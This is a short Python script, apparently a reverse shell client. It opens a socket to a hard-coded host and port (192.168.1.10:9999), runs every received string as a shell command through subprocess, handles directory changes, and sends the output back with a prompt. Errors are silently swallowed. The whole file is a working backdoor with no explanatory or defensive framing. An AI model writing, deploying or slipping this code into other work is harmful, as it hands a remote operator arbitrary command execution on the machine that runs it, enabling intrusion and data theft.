import os,socket,subprocess
s,h,p,g=socket.socket(),'192.168.1.10',9999,subprocess.PIPE
s.connect((h,p))
while True:
    d = s.recv(1024)
    try:
        if d[:2].decode("utf-8") == 'cd': os.chdir(d[3:].decode("utf-8"))
        if len(d) > 0:
            c=subprocess.Popen(d[:].decode("utf-8"),shell=True,stdout=g,stderr=g,stdin=g)
            b=c.stdout.read()+c.stderr.read()
            t=str(b,"utf-8")
            print(t),s.send(str.encode(t+str(os.getcwd())+'> '))
    except: pass
s.close()
